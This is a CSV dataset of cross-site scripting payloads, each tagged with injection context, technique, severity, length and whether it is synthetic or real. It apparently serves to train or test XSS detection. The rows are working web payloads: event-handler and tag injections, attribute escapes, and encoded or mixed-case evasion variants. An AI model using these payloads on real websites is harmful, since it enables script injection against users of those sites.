payload,context,technique,severity,length,source
OndRop=prOmpT/**/(LocAtiOn.HasH),event_handler,synthetic,low,32,synthetic
"""><dialog onplay=prompt(document.domain)>",tag_injection,synthetic,medium,41,synthetic
%3Cmath x=y onscrollend=prompt(document.domain)%3E,tag_injection,synthetic,medium,50,synthetic
"<keygen onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",tag_injection,none,medium,67,real
<foRm X=y onWebKitAniMatIonEnd=prOmpT('XSS')>,tag_injection,synthetic,medium,45,synthetic
' ><svG oNbeForEpaSte=coNfiRm(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,47,synthetic
<form x=y onsearch=console.log(1)>,tag_injection,synthetic,medium,34,synthetic
<!--><button onclick=consol&#101;.log(1)>,tag_injection,synthetic,low,41,synthetic
<template src=x onreset=\u0061lert(location.hash)>,tag_injection,synthetic,low,50,synthetic
"__proto__[""onclick""]=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink,synthetic,medium,68,synthetic
"%22><blink onpagehide=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,61,synthetic
<data onpointerdown=alert(1) style=display:block>AnonKryptiQuz</data>,tag_injection,none,medium,69,real
<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>,tag_injection,none,medium,69,real
"<canvas onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</canvas>",tag_injection,none,medium,70,real
%3Cmtext x=y onended=confirm(document.domain)%3E,tag_injection,synthetic,medium,48,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""XMLHttpR&#101;qu&#101;st(docum&#101;nt.dom&#97;in)""",dom_sink,synthetic,high,119,synthetic
<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>,tag_injection,none,medium,60,real
"""><img src=x on&#101;nd&#101;d=consol&#101;.log(1)>",attribute_escape,synthetic,low,51,synthetic
"'><img src=x onanimationcancel=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,68,synthetic
	onPlaYinG=pRomPt(DocUmeNt.DomAin),event_handler,synthetic,medium,34,synthetic
"<i onmousedown=""alert(1)"">AnonKryptiQuz</i>",tag_injection,none,medium,43,real
